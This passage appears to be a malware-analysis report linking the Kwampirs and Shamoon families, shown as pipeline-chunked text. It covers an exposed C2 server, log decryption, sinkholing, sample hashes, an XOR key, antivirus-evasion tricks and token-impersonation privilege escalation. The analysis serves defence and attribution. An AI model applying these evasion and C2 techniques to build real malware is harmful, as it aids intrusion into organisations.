A handful of files of particular importance are: s.php → contains the string “This work!”... almost like Apache’s “It works!” (Figure 39)."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|6484a0ec19ad4271a1e5c7d79c103bc4
"A handful of files of particular importance are: s.php → contains the string “This work!”... almost like Apache’s “It works!” (Figure 39).

The domain was protected using Cloudflare, making it difficult to uncover the server’s physical location, hosting provider, or co-hosted domains. However, the Apache web server used was configured to allow open directory listings for all directories, including the web root, which provided a glimpse into the contents of the C2 server.

5.3.1 Web Server Contents The domain name for the server was “servncjikjpbn.in”, believed to be active from August 2018 to November 2018, contained the following structure in its root web directory shown in Figure 38.

5.3.2 Modification Timestamps The screenshots of the web server directory listings in the previous section show the modification timestamps for the files and directories contained. While some appear to be within the expected general range of 2018, such as the files and directories in the root directory, other files appear to predate the campaign: main.php, the PHP script handling reporter communication, shows a modification time of April 30, 2016 cmd/, a directory believed to store downloadable modules, shows a modification time of January 8, 2010 PuK, an unknown public key embedded also in all the Kwampirs reporter binaries, contains a modification time of July 10, 2009 The timestamp for main.php falls within the known Kwampirs activity timeline, which is believed to begin in 2015. However, the cmd/ and PuK timestamps significantly predate the first known Kwampirs activity, and even that of Shamoon. While this server was not in use then, it is likely that the base contents of this server were stored and deployed using a timestamp-preserving tar/gz file from past servers. While it is certainly possible to fake these timestamps, it seems like an unlikely precaution to take. One expects that the group would ensure no directory listings were being exposed, if they were conscious of such details. While it could be argued that the directory listings could have been intentionally left open to expose the intentionally modified timestamps, it seems safe to invoke Occam’s Razor here.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|7324babf8f6641bba46ed6f05d5ccc75
Additionally, if this was the case, it would be most sensible to fake the timestamp of main.php, as the path would be known to any researcher, and the web server may send this date as the last-modified header. It is also worth noting that the hours found in the various timestamps are within a ~12-hour range from 03:00 UTC to 15:30 UTC, ignoring the log directory whose contents are updated automatically by main.php. Considering daylight savings for applicable timestamps, this range maps to approximately 8:00 am - 7:00 pm in Tehran’s local timezone.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|5bff2bae8679474b8e316b5be11d145a
"5.3.3 Exposed Logs The users/users/files/log/ directory contains log files that are exposed and accessible to web browsers. The log files increased in size proportional to the volume of HTTP requests to main. php, indicating that they were used to store requests from infected hosts. The naming scheme is simple: The “cl” filename seems to be an acronym of “Current Log” When this file nears 1MB in size it is compressed to a 56kb “7z” file, which includes a datetime string in the new filename (something like cl_YYYYMMDDHHMMSS.7z). A new “cl” file is then created and the log rotation is completed. Each log file contains records corresponding to HTTP requests performed by infected hosts. The logs are encrypted and base64 encoded. The encryption key is identical to one present in and used by Kwampirs binaries, making it very easy to decrypt the logs. Unfortunately, the web server was improperly configured with Cloudflare’s reverse proxy and reported Cloudflare proxy IP addresses instead of the true (external) IP addresses behind each victim request. While it was possible to view the information in the request payloads logged, it was not possible to analyze the geographic distribution for many of the infected hosts. The payloads contained the local IP addresses of the victim and geolocation was not possible. Then researchers thought of the possibility of sinkholing some domains to uncover some of the real victims.

5.3.4 Sinkhole Domains Kwampirs’ C2 selection logic is simple and noisy: it will start at a random offset in the list of C2 addresses and try them one-by-one. The C2 lists are a mixture of IP addresses and domain names, of which the majority of the latter are not yet registered. Registering one of the available domains within a C2 list will therefore provide telemetry regarding the set of actively-infected hosts as they attempt to find an active C2 at set intervals, starting in a random position of the C2 lists and then iterating one by one until a valid response is received. On the other hand, providing new samples to download from these sinkholes does not look possible, as the downloaded components are cryptographically signed and checked with a hardcoded key at the dropper before any execution. Cylera researchers registered at least one domain per unique C2 list contained within each analyzed sample to view a cross-section of infected hosts across different campaigns. The domains registered are shown in Table 3

5.4 Indicators of co-evolution Many researchers were surprised about Shamoon 2 campaigns. Shamoon reappearance was somehow unexpected, especially because it had been a long time since Shamoon 1 (almost 5 years, at least on publicly known campaigns). However, Cylera Labs assess: That while Shamoon was left in the vault, its code was forked into Kwampirs, used against strategic targets for CNE That at some point, the actors decided to recover the Shamoon wiper with destructive intentions. That part of the Kwampirs’ changes were transferred back to Shamoon for campaigns 2 and 3. That both projects have their own paths now, one for destructive operations the other for network and infrastructure exploration, but maybe they should be considered the same malware family. In this section our researchers explain: A reasonable doubt of ambiguous ancestry, since some dates found seems to indicate that Kwampirs existed even before Shamoon 1. A sample discovered that looks like the starting point of the fork between the two malware families. The divergence of both families’ evolution, from a code level perspective including: Differential analysis for each new version of both malware families, key similarities, code added, updated, deleted. Key pieces of code that allowed researchers to understand how the projects diverged and why.

The linkage between Kwampirs and Shamoon

5.4.1 Ambiguous Ancestry

Shamoon C2s

Based on the dates of known attacks it appears that Shamoon, with its first known usage occurring in 2012, predates Kwampirs, whose first known usage (or at least detection) occurred in 2015. There are a handful of details that seem to potentially contradict this notion of ancestry. Cylera researchers do not discard the possibility that there could be a precursor Kwampirs version even before Shamoon 1, which would be just a lightweight Shamoon, with only the reporter components for CNE operations.

Shamoon samples often contain non-functional C2s, sometimes overtly invalid (i.e. 1.1.1.1.) This may indicate that the samples were generated from a template, or using a builder tool, that takes C2 options as parameters. It is strange that the samples would include this when no active C2 was in use for years, so this may indicate that Shamoon was based on code that already included C2 logic (which will be covered in later sections)."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|8c70d3f5b1354f2c92afcd009ab2cb2c
A few details considered are: Compile Times The compile times for Kwampirs samples are within the 2010-2012 range, predating those of Shamoon. However, these can be manipulated very easily, and there are samples with obviously modified timestamps (i.e. from 2001, compiled with Visual Studio 2010). This reduces the amount of validity of the timestamps and compile times analyzed. This would indicate the binaries were built using a host or virtual machines that had a date which was set intentionally to obscure its creation time. Interestingly, Shamoon’s dropper sets the date on infected hosts back to a point in time where the license key embedded for the Eidos disk driver was valid; however, there is no evidence this is related, and the Kwampirs compilation times actually predate this time.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|386f9f96809d4addb2485b51e9f47e24
Kwampirs C2 Timestamps Timestamps of key files and directories on the Kwampirs C2 server date back to 2009. A few core directories, such as /log and /cmd date back to 2010. This may imply that Kwampirs was active at the time; but it may alternatively imply that Kwampirs’ C2 was based on an earlier family, such as Shamoon’s. Keep in mind that the protocol is still the same, and both families return a prefix of “911” from the C2. These dates could be preserved over the deployment of the file structure, during the decompression process of the files. It seems entirely unnecessary to fake the timestamps of these files, and the fact that they left the directory listings exposed indicates they were not particularly cautious when setting up the C2. However, it is possible that these files were created within a VM whose date was rewinded, and that the older timestamps were therefore modified as a potentially-unintended side effect.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|43eef86f218c412187ad5430abdcd94f
"Simplicity It would be expected that future iterations and development of an application, malware or otherwise, would often increase the complexity and overall entropy of the application. This, however, does not often seem to be the case -- Kwampirs often appears simpler, with less abstraction, than Shamoon. This, of course, is not a definitive indicator of anything, as Kwampirs lacks the destructive components of Shamoon and the Eidos driver. On the other hand, Kwampirs sometimes exhibits improved functionality, such as the usage of GetTcpTable to spread past local /24 ranges. And the changes performed to Kwampirs with respect to Shamoon seems to follow two goals. First: minimize size and simplify the malware stack, reducing it to just perform a light reconnaissance (completed with a more detailed module downloaded from the C2, if they are interested in the target). Second: remove and/ or modify strings and code that could be potentially used by antivirus rules to evade detection (and implicitly to diverge more from Shamoon). Taking this in consideration, and given that Kwampirs doesn’t need a wiper module, an archiver component, or the Eldos driver (or any other), complexity gets lowered.

The linkage between Kwampirs and Shamoon

5.4.2 The missing link (886e7) In November 2019, an old dropper was uploaded to VirusTotal (Figure 45) from Saudi Arabia that shed some additional light on the evolution of Shamoon and Kwampirs, completing the puzzle of its evolution. Our researchers believe this sample is dated between Shamoon 1 and all the known Kwampirs campaigns, at least all that Cylera labs is aware of. One of two C2 IP addresses hardcoded in the sample is contained with a netblock that was assigned to Netflix in mid 2015, making this sample likely to have been created and used before then."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|aa2a22565c4a4dc6a306239e3f12e918

This mixture of components seems so interesting that we believe it could be the starting point of the fork between both families: The resources are named PKCS12 and PKCS7, similar to the first Shamoon. There’s some dead code, unreachable by default, indicating that this sample was probably compiled in the middle of a refactor or repurpose process. The resources are executables, similar to Shamoon, but the downloaded components are DLLs, with the same loader code as Kwampirs. The resources contain only reporter modules, without a wiper, like Kwampirs. Both reporters use “ItIsMe” as the user agent (Figure 46), like some early Kwampirs samples, which seems like a continuation of the one used by Shamoon (“you”). Researchers found requests with this user-agent at the sinkhole server, indicating that there is still some activity of infected hosts (See for example the sample: a5e5b4e6caf7ac3ac8d9b7b3527f767ff011d138246686822fea213a3b0597fc).

One of the reporter modules sends data similar to the data sent by the first Shamoon, including a similar format and similar values (i.e. tick count for cache busting). The second reporter reduces the number of parameters and encodes everything into a base64 string, except the value of GetTickCount, in a very similar way as Kwampirs does. The C2 returns data in the format of the Kwampirs C2, not like Shamoon 1. We know this because the sample explicitly looks for 911: in the messages received (Figure 47), which is used by the Kwampirs C2 to download additional modules.

In Kwampirs, when the reporter executes the downloaded component (DLL), it will search for an exported function called “CF”. Turns out this sample uses the string “cmdFunc” for the same purpose, so CF is probably the acronym in which it evolved. The C2s are hardcoded in clear text within the binary, like Shamoon 1. The sample uses GetExtendedTcpTable, similar to Kwampirs’ use of GetTcpTable. On the other hand, Shamoon versions do not use any of these propagation methods. Some hypotheses for this limitation are explained in the Shamoons usage section. Name arrays for the executables name selection contains wmi* related names (Figure 48), just like Kwampirs, so it seems that with Kwampirs they removed the rest and started from there:

Figure 47: Sample checking “911” value"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|244d38eaa5a8490fb3131f91e684c356
"Figure 47: Sample checking “911” value

Note: Later in Kwampirs they removed the explicit check of the string 911, which was replaced by a cryptographic signature check. The presence of the string “911:” in the C2 responses did continue after that. This change was probably motivated because someone (another nation state) could hijack the victims issuing them to download other modules (researchers cannot tell if this happened with Kwampirs, but there are reports indicating that other botnets (some presumably belonging to Iranian APTs) were hijacked as shown it the Snowden leaks. This could happen because after this sample (886e7..), they started adding lists of unregistered C2s, which could be sinkholed. The first versions were downloading the DLL component and executing it without further inspection of the source legitimity, opening the possibility to create sinkholes based on the C2 lists and distribute custom executables to the victims, which could be used to “steal” the victims (or to distribute a vaccine too).

Other noteworthy points about this sample are: Timestamps of the samples were set to the morning of September 11, 2001, right in between the collision of the first and second planes. The dropped files have similar timestamps, but slightly later in the day, which likely indicates that the resources were built in a VM with the clock rewound. This anti-American message also matches the burning American flag that the original Shamoon attack wrote to the disk. The XOR keys used in the resources are unique relative to other samples The second reporter contains the same C2 servers but replaces .aspx with .htm. It also leaks less information on the URLs built with the host information, but the responses are handled in the same way.

Due to the upload date one would initially assume that this is a recent sample. However, analysis of the code shows that the sample appears to contain way more simpler, more basic logic and abstraction in the reporters (just the bones). For example, the function handling C2 communication performs more brittle checks, such as directly looking for 911, directly within the function itself, while normal Kwampirs samples have more robust checks (cryptographic signature) and abstract the functionality out to separate functions (ignoring the possibility of inlining). Analysis of the C2 IPs shows that both are unlikely to be under the attacker’s control currently (one is owned by Netflix), though it is possible. However, the IPs were used for web hosting in the general range of 2010 - 2015, which potentially indicates that this is when the sample was in use. This would place it before the known Kwampirs campaigns, and after the first Shamoon 1 attack. It aligns with the possibility that Kwampirs was developed from this sample. The usage of the “ItIsMe” user agent is only seen in these two reporters and in one of the original Kwampirs samples (the first one known), which also implies that 886e7 predates the first Kwampirs. It also mirrors the first Shamoon’s “you” user agent, which was later changed to match typical browser values (as was Kwampirs)."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|e90fff794bf74092b5825558cd9ada8c
"The usage of GetExtendedTcpTable is also interesting; the first known Kwampirs binary does not use this method in its propagation function. Kwampirs binaries from later campaigns use GetTcpTable, which returns only IPv4 values. This could indicate that this sample came between the first known Kwampirs sample (2015) and the next (2016). Researchers conclude this is likely a step between Shamoon & Kwampirs: possibly the starting point of Kwampirs own malware family.

5.4.3 Differential analysis of the Reporters Having the aforementioned missing link, Cylera researchers thought that it could be possible to rebuild the “commit history” and timeline, not based on dates but on the code evolution itself, of both Shamoon and Kwampirs from scratch, since the timestamps of the Kwampirs samples were manipulated. There are a few dates that can be found from OSINT, and Shamoon campaigns are publicly known, but the key here is to understand how the fork of both families occurred, what were the purposes, and if we identify anything that could help us assess if Kwampirs could be a false flag operation or just the opposite. Kwampirs main activity begins between Shamoon 1 and Shamoon 2. For this analysis Cylera Labs gathered the Shamoon reporters corresponding to versions 1 and 2 along with Kwampirs reporters from all the known versions to date and the reporters of the sample 886e7. Having them all in the same set, we then compared each of them through code changes. Sorting and inspecting the results, our researchers were able to see how the evolution occurred between the two families, rebuilding the history timeline, all inferred just by code changes. The results are explained following the inferred order of the samples analyzed, mentioning also the names of campaigns assigned by Reversing Labs for the samples that they track."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|cff49386a8e04628b3c4e4f26ad90ab6

Also note that for Kwampirs samples there can be multiple hashes identifying the same compilation because of a different set of C2s, and because it started changing some bytes after each infection to make each sample look like a different one. This way, when a researcher checks if a sample is available at VT (just if an antivirus or EDR checks a specific hash value), it may look as if it is not malicious, but only because the hash was not seen yet because of a few bytes changes. This kind of duplication has been resolved for the analysis, and Cylera researchers have selected only a set of hashes that represent different versions (even with small code changes). In order to perform the comparison of all these reporters, our researchers extensively used the tool radiff2 from radare2, for clustering samples by proximity and setting an initial order between versions (looking also at the number of functions implemented, the number of imports, etc). In addition, we used diaphora (with IDA pro), to inspect the differences between every pair of these versions one by one (with the pre established order), inspecting with greater detail, just like DNA sequences, to identify feature updates, bug fixes, functionality removed and new features. In short, we traced the evolution through differential analysis.

Configuration values were not decrypted in runtime, and the Shamoon 1 reporter was capable of doing two things with the C2 response: downloading and executing a new “.exe” component (renamed as “filer”), which seems it could be used for doing “remote backups” before destroying), or modifying the detonation date of the wiper component. The execution was apparently broken (Figure 50) because some of the format strings were specified as capital letters (“%S%S….”).

“886e7” (aka, the Kwampirs fork initial commit) Shamoon 1 can be traced back to 2012. Some time after August of that year and before 2015 (when Kwampirs’ first sample was identified), the Shamoon malware family forks, creating a lightweight version without destructive components but still with some traces of them in the code.

It does reduce the number of parameters to two (Figure 53), and the first is set to NULL, except the value of GetTickCount (for busting web caches). This means that the only purpose of this one was to download and execute an additional module from a C2.

In both reporters, the C2 returns data in the same format as Kwampirs C2 (different to Shamoon 1). We know this because the samples explicitly look for the prefix “911:” in the messages received (Figure 54), and this is how Kwampirs C2 was indicating victims to download additional modules (responding with 911:md5_of_module_to_download).

The linkage between Kwampirs and Shamoon

Both use the same XOR key (“¦(}¡È¦(}â”) to decrypt the downloaded component, which is a DLL instead of an exe (differing from Shamoon 1, but exactly the same as Kwampirs). In the same way as Kwampirs does, both reporters will load the dll in memory and both will search for an exported function called “cmdFunc” (Figure 55).

Campaign 0 After 886e7 our researchers believe the authors start what could be considered Kwampirs own path, with sample a5e5b4e6caf7ac3ac8d9b7b3527f767ff011d138246686822fea213a3b0597fc (campaign 0 identified by Reversing Labs). This sample starts shifting Kwampirs away from Shamoon, to avoid detection via Shamoon patterns. -

This reporter is a DLL, not an “.exe” file, as opposed to previous reporters. The name of the reporter is “Actuator.dll” (Figure 56).

The new reporter starts adding garbage strings (Figure 57), the same as the dropper components (something that was not found in the 886e7 reporters).

Turns out Kwampirs samples use the string “CF” for the same purpose, so they switched to the acronym.

Configuration constant strings are encrypted using an XOR based algorithm (Figure 58).

This sample has two XOR-encrypted C2 lists, ~100 URLs each (Figure 59), like Kwampirs’ known C2 lists , as well as proxy and proxy bypass configurations (if available, but we have not found a sample using these options).

Depending on the number of arguments, the configuration will be decrypted and it will launch a thread activating the payload functionality. This thread will pick a random host from the main C2 list, which may have proxy and proxy-bypass configuration settings. If the communication cannot be established with this set of C2s, it will fall back to the secondary list, picking a random start as well (Figure 60)."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|d3baab0b50864301a2ec1b5d06912944
"While Kwampirs’ dropper gets compatible with x64 in the reporter, they want to get back to retrieving more host information using the Windows API from the victim before getting additional modules from the C2, probably to avoid fake victims (bots) from researchers, sandboxes, etc. So they start retrieving the network adapter’s information (MAC address) again, as well as native system and version info, and the keyboard layouts (Figure 61).

This information is packed into a custom buffer, encrypted with a simple XOR-based algorithm using the key in Figure 62 and encoded in base64 before appending it to the final URL.

The reporter requests the previously built URL to the C2, which responds with the payload of the additional module. Then the reporter performs a cryptographic signature check against the downloaded module with an RSA1 public key that is embedded in it, possibly to avoid MITM attacks from other nation states (Figure 63).

The URL format is changed to minimize the number of parameters to just one (cache parameter disappears). Still in clear text, but only for a while (Figure 64).

The callback function for starting the downloaded component is renamed to CF.

The public key was released by Symantec in their Yara rules. It is worth mentioning that this RSA1 key is consistent in all the reporters analyzed, which means that very likely the actor has been the same in all the campaigns (but keys stolen too).

Cylera researchers believe the program makes all these changes with two goals in mind. First, one tries to diverge both families, specializing just for CNE, minimizing number and size of the components, and second, improving AV evasion and resilience, changing some of the constant strings, adding configuration encryption, and adding a larger set of C2 lists.

Lost sample between campaigns 0 and 1 A sample between RLs campaigns 0 and 1. Just a bit later appears another version, 4f94d67c9da7e340b258e26dee7269c89f1e7c2c2625a96073adeec794541e66. In the timeline, this sample would be between campaigns 0 and 1. This sample is pretty similar to the previous one, but has a kind of file cache for the information gathered from the host in the first stage (network adapters info, native system and version info, and keyboard layout). The user agent is also switched from “ItIsMe” to “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0” (Figure 66). This is probably done to “break” the simple connection to Shamoon just by user-agent. The number of functions changes from 101 to 106. These represent pretty small changes but seem to prepare the reporter for communicating through a “privileged process proxy” component that we will uncover later.

This reporter contains another component (resource 104) that acts as a process proxy for downloading and executing new modules by impersonating the user token of “explorer.exe”, ala mimikatz style. The resource 104 is a bitmap image (Figure 67) containing the component stored by the end, to make the image look as if it was corrupted (note that Kwampirs’ reporters are stored in the same way on the droppers).

It is a privilege escalation based on user tokens. Communication with this component is performed using pipes (Figure 68) through the CreatePipe() function. By pivoting on this component for privilege escalation, Kwampirs is able to perform internet-related queries in cases where the user does not have enough privileges. This improvement is, in later Kwampirs’ versions, refactored and integrated into the main Kwampirs binary as another runmode to minimize the number of components to be dropped and as a technique for confusing static analysis based on the invocation parameters.

The size of the sample is increased to 530 because of the resource image containing the “process proxy” payload, while previous samples were around 148Kb. This sample has two large C2 lists (~100 URLs each), like the previous Kwampirs C2 lists, but stored in clear text (Figure 71), as opposed to other Kwampirs. It is strange because previous versions were already decrypting the lists in runtime. Our researchers believe they were in the middle of a refactor of the configuration, as explained in the next point."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|6016cee0d8c145a888b9dd83e1f03c7b
"In this sample, something strange happened with the encrypted configuration. The main configuration decryption function gets a new function level -- a function on top of it. The size of the C2 lists appears to now be stored in ASCII, and it gets converted to an integer with the atoi() function. This is strange because the size was not “moved around” before. It was just accessed directly where it was needed and in binary (integer) format already. But in this sample, it is in ASCII in one fixed offset, and then converted to integer (Figure 72) and used later in other parts related to the C2 lists configuration preparation. At the same time, the offsets of the configuration lists (with the sizes) are grouped by the end of the old decryption routine.

The upper level function processes these offsets as raw buffers, converting the ASCII raw lists (separated by new lines) to arrays (Figure 73). This is all auxiliary code related to the template system.

The C2 lists are not encrypted, but our researchers conclude this could be exactly the version where the builder and template were being created (or tested) because: 1

It seems strange that these offsets all get grouped by the end of the routine. It is a sign the developers were doing a refactor preparing all the code related to supporting the template system. Our researchers confirm most of the properties that can be set with the placeholders seen from the leaked template are grouped at this area.

3

And the sizes appear stored in ASCII, not as binary. They just copy the values of the templates as ASCII, and then a conversion is needed.

Neither the small traces “leaking” the presence of the template, nor the failing code wrapping the dead code on the x64 Dropper, were found in Shamoon 1. Then this is probably because there was no builder yet (or if there was, it was a very rudimentary one). The most simple explanation is that Kwampirs was possibly first using this template system, and then this system was adopted back to Shamoon 2 (as it is a clear copy), but failed in the macro wrapping code (Ops problem now ;-) ). Last but not least, checkout how this reporter starts impersonating user tokens via explorer.exe tokens for creating new processes. Here is how the “proxy process” is created: 4

First it will iterate through all the running processes to find the PID (process ID) of explorer. exe (Figure 74).

Cylera researchers believe the next samples would be the ones corresponding to Campaigns E and F, as opposed to Reversing Labs campaigns A and B. Simply because the garbage strings are the same, and they use them to evade antivirus firms that are created by using them. The reason is that Campaigns 1, E and F use the “garbage string” “hjghjkdsfhgdf\nuidfygf\njkjkjki” (Figure 77), while campaigns A, B, C and D use “11hjghjkdsfhgdf\nuidfygf\njkjkjki”. It would make no sense to go back again to an already used “garbage string” after changing it (but who knows? It doesn’t make much sense to have the previous string contained inside the next one too).

The match is almost perfect. However, focusing on reviewing the differences of this set of versions in comparison to Campaign 1, which are just a continuation: More static strings become “built strings”, or in other words, strings built in the stack frame issuing movs. This way strings are hidden for commands extracting raw/static strings from the binary.

Another thing changing with respect to Campaign 1 is the way it performs some write operations in the Windows root directory. It does a 2-stage write pivoting in temporary files and then concatenates with a cli command, probably to avoid some antivirus signatures and other detection systems (Figure 84). 1

More importantly, the reporter of both Kwampirs and Shamoon 2 collects the same host information (API calls) for the initial request.

But at the same time, the C2 communications follow the same specifications, except the responses (EXE components and detonation dates for Shamoon, DLLs for Kwampirs). Something else to notice here is that many of the Shamoon 2 literal strings are now decrypted in runtime, with a simple algorithm based on single value addition. And Kwampirs started using decryption of strings in runtime too, but with a simple XOR based algorithm.

One of the late Kwampirs (as mentioned in another section), leaks the reporter template with a dropper of 1314a078a06d1dc528014715d229b173ed5fbdff42ccde33fb933cdb0b82727e (explained in the “Builder exposed” section). Shamoon 2 and 3, in their 64-bit dropper, leaks similar placeholders on a buggy, unfinished, or incomplete template render. This is also commented on in the attribution section. The analysis could continue with Shamoon 3, which also leaks these placeholders on the x64 dropper, but there aren’t any further significant details to point out. Following this sort of reporters, Cylera researchers want to point out that this is a clear sequence of small improvements between versions, in such a way that Kwampirs’ reporter does not appear as its own version from scratch. Instead there is a path of small improvements step- by-step starting from Shamoon, through the reporters of 886e7, Campaign 0, the samples between 0 and Campaign 1, in Campaign 1, and then the set from A to F. Many of those changes were also applied back to Shamoon 2 and 3 reporters (starting around December 2016), with the motivation of evading detections, protecting the botnets from third-party operations (cryptographically signing and checking the downloaded modules), and improving in terms of efficiency."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|285836008f6044e5adebcd7093a25313

5.5 Shamoon Usage Unit 42’s analysis of Shamoon 2 uncovered a zip file containing tools used by the attackers to deploy Shamoon in a target organization. This showed that attackers would manually infiltrate an initial server, referred to as the Distribution Server by Unit 42, which was then used to infect the organization. Interestingly, the infection itself was done manually, using scripts and binaries contained in the zip file. Shamoon’s propagation method only scans the host’s local /24 range, like Kwampirs’. Many researchers have wondered how Shamoon could prove so destructive, destroying 30,000 hosts in its 2012 attack, when each infected host could only infect devices on its local subnets. No matter what the host’s true local subnet is (/23, /24, /25, etc) it could only possibly infect up to 256 hosts (254 if it is indeed on a /24) for each network adapter with an IP address. However, each of those infected hosts could only infect the same hosts that the original host could, as they reside in the same /24. Only if it had more than one network adapter could it propagate over a different subnet, which still sounds somehow limited. The finding of the zip file by Unit 42 sheds light on how mass destruction was made possible. The distribution server contained a list of hosts that the attacker would compromise and infect with the Shamoon dropper, using scripts and binaries in the zip file. These hosts span multiple subnets, and from there infect hosts on their local /24.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|0d8d4c353df744f795fd1c23cd1f09fb
Therefore, the propagation between /24 ranges was done from the distribution server, surprisingly manually (with the helper scripts). What does this tell us? First, there is clearly a heavy reconnaissance phase -- not only is a list of hosts needed, but the Shamoon binaries themselves often contain credentials specific to the organization. Shamoon is not suited for this reconnaissance, so it is possible that attackers used another tool to handle this process (if it was not done manually). This also shows us that the usage of template systems was a certain necessity. Beyond customizing binaries for new large campaigns, attackers often had the need to customize binaries for each individual target. The sloppy nature of some binaries (i.e. including double resources or the template resource) may indicate that the attackers did this as part of their initial infection phase on the distribution server.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|c7e8d32f5fa1442ebc756a3faa4a9fe7
Next, the issue regarding /24 spread raises an interesting point -- Kwampirs actually worked around this by adding usage of Get*TcpTable to the second (and later) variants. This looked for active connections on the infected host and attempted to spread to the remote peers (no matter from which subnet). Interestingly, Shamoon did not include this type of functionality, even in later versions. One would assume that this would be desired functionality in Shamoon, and if the two threat actors were linked they would have added it to both. However, it may very well be the opposite; for malware of a destructive nature, the attackers may have wanted stricter control over where the wiper would propagate. This way it would not spread to, and wipe hosts on, unintended remote networks, networks over VPN connections, etc. The Shamoon binaries often included credentials specific to the organization, which prior researchers believed were retrieved from the organization’s AD servers. As most workstations will often establish connections to them, Kwampirs’ usage of GetTcpTable may have stemmed from the desire to reach these servers for reconnaissance. Researchers have uncovered usage of other tools like ISMDoor linked to Iranian APTs, such as Greenbug, directly before Shamoon 2 and Shamoon 3 attacks, so it is clear that the attackers use multiple tools throughout the entire attack process.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|cc992536335242ef8d8575f42e0a0b69
"Usage of Kwampirs would provide an additional benefit: because the propagation mechanisms were extremely similar (Kwampirs contains the same propagation as Shamoon plus the extra Get*TcpTable mechanism that enables wider propagation), the spread of Kwampirs would provide an indication of how Shamoon’s spread would work. This would potentially let the attackers gauge the magnitude of damage that Shamoon could perform, while disguising the fact that they were planning a wiper attack if the Kwampirs sample was discovered (as it did not contain a wiper).

The linkage between Kwampirs and Shamoon

5.6 Regarding Shamoon open source projects Researching on attribution, the first thoughts were pointing to original Shamoon authors. However, it turns out there are at least two reverse-engineered versions of Shamoon’s source code publicly available. This fact turns attribution into something even more complicated, and our researchers took some time looking very thoroughly into these projects:

And Torres’ Disttrack has the following code for the same comparison (Snippet 14), probably based on the previous version of Roggia’s Shamoon code, per the copyright header date. if(strlen(inet_ntoa(in)) <= 19) Snippet 14: Michael Torres’ source code of Disttrack"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|e24da94a7f0b47b3aa46e716c35b05f1
christian-roggia/open-Shamoon (developed by Christian Roggia) micrictor/disttrack (developed by Michael R. Torres but based on Christian Roggia’s first source, as the license headers display “Copyright 2013 Christian Roggia”) Most of the code of Torres’ Disttrack is based on Christian Roggia’s open-Shamoon, and the earliest date (2013) can be found on the copyright headers of the source files. There are a lot of obvious differences with Kwampirs, as this project’s purpose is to mimic Shamoon as much as possible. But even with Shamoon (and Kwampirs), one can spot some differences, since people inferring the code can make some mistakes or interpretations that do not really adjust to the exact code, leading to small inconsistencies. Taking some time, one can find this kind of inconsistency between the open sourced codes and the binary samples, in utility functions usage, and even in the logic’s interpretation. As an example, in the original Shamoon 1 sample while reading the addresses of network adapters, a conversion to ASCII string is performed. Then the length of the resulting string is calculated, and this value minus one is compared against the number 18 (Snippet 12). Even decompilers will display the original Shamoon version like this (same as Kwampirs).|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|66ba6aa2654245a0b9cc9c89975c2829
"Referenced line can be found here: micrictor/disttrack Comparing the length being less than or equal to 19 is totally correct in terms of logic, as it is the same as the length of “minus one” (less than or equal to 18). At assembly level, we found this “minus one” in the original Shamoon and Kwampirs, as “lea ecx, [eax-1]” (Figure 89), but cannot find it in the reverse engineered versions. Cylera researchers do not believe the compiler would introduce this “minus one,” but the source code itself would have it. If the compiler introduced it, it would be treating an unsigned number as signed, which in some cases (i.e. when comparing to greater than zero) could be just catastrophic as the integer could underflow. But researchers do not discard a person optimizing the comparison erroneously like this. Therefore, if Kwampirs was based on those projects, our researchers believe this kind of inconsistency would have been populated to newer binaries, and it looks like that did not happen. Kwampirs keeps that “minus one” in its code, so it seems that Kwampirs code was not based on either of these two reverse engineered projects. Kwampirs binary:

Turns out we have found some hidden handlers in Shamoon 2 (and 3), see Figures 92 and 93. pointing to the same Kwampirs template system (which is also explained at section “Common Template System Exposed”), specifically at the 64-bit version of the dropper component (which is first hidden at the resources of the 32-bit dropper). Reference code is found at one of the configuration decryption related routines (64-bit dropper with sha256 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34 function 0x140004900 ):

###AV1### and ###AV2### placeholders are located in the same area as the resource payload configuration settings, needed for payload extraction: at the configuration decryption routines. Our researchers have matched these placeholders corresponding to the resource configuration related to the 64-bit version of the dropper. It is very likely to be dead code related to the macros handling the multi-architecture compilation process. In Shamoon 2, the same source code is used for producing 32-bit and 64-bit binaries, and the 32-bit version of the dropper embeds the 64-bit version as a resource named x509. But the 64-bit dropper does not need to embed yet another dropper for a different platform, and this is why these placeholders were not rendered for the 64-bit dropper, which is correct. The attackers’ mistake is that they did not wrap the related instructions with a macro similar to the following example in C code shown at Snippet 15, which lead to the inclusion of dead code containing the unrendered placeholders in the final 64-bit dropper:

A macro like that one would have omitted the insertion of the code related to those two placeholders, avoiding the exposure of the presence of the builder at the configuration decryption routines (exposed in Figure 93). On the other hand, the attackers correctly handled similar macros when wrapping (avoiding to include) the 64-bit resource dropping (as expected) : The 32-bit version of the dropper checks if the architecture is 64-bit and tries to drop and switch to the 64-bit dropper executable (Figure 94).

